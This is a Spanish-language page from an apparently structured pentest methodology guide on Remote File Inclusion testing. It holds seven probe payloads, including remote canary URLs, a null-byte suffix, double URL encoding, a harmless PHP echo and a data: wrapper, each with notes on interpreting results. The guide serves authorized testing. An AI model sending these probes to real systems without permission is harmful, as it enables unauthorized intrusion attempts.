# 🗡️ Remote File Inclusion (RFI): payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Include HTTPS a canary propio

**Objetivo:** Comprobar si un parámetro de plantilla acepta una URL remota.

```http
GET /view?template=https%3A%2F%2F{CONTROLLED_HOST}%2Fcanary-{NONCE}.txt HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Una callback externa demuestra fetch; solo se habla de RFI si el contenido entra al intérprete o plantilla.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

### 2. Include HTTP a canary propio

**Objetivo:** Distinguir allowlist de esquemas o bloqueo por TLS.

```text
http://{CONTROLLED_HOST}/canary-{NONCE}.txt
```

**Interpretación:** Comparar con HTTPS bajo el mismo host y contenido. Un rechazo por política no es vulnerabilidad.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

### 3. Contenido PHP inocuo en laboratorio

**Objetivo:** Distinguir inclusión textual de evaluación por intérprete PHP.

```php
<?php echo "RFI-CANARY-{NONCE}"; ?>
```

**Interpretación:** Servirlo desde host propio solo a una app de laboratorio. El marcador calculado debe aparecer sin el código fuente.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

### 4. Extensión añadida por backend

**Objetivo:** Comprobar si el servidor agrega `.php` al valor.

```text
https://{CONTROLLED_HOST}/plantilla-{NONCE}%00
```

**Interpretación:** El byte nulo solo es relevante en stacks legacy; verificar URL solicitada en el servidor propio.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

### 5. Doble codificación de URL

**Objetivo:** Identificar si dos decoders transforman la URL remota.

```text
https%253A%252F%252F{CONTROLLED_HOST}%252Fcanary-{NONCE}.txt
```

**Interpretación:** Una callback tras doble decodificación indica discrepancia de parser, no necesariamente evaluación.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

### 6. Ruta local como control

**Objetivo:** Comparar con la plantilla legítima local.

```http
GET /view?template={PLANTILLA_PERMITIDA} HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Identificar diferencias de renderizado, tipo de respuesta y logs del host controlado.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/file-upload).

### 7. Esquema data en laboratorio

**Objetivo:** Comprobar si un include PHP acepta wrappers remotos configurados.

```text
data:text/plain,<?php%20echo%20"RFI-CANARY-{NONCE}";%20?>
```

**Interpretación:** Requiere configuración legacy `allow_url_include`; usar solo en laboratorio, sin comandos del sistema.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
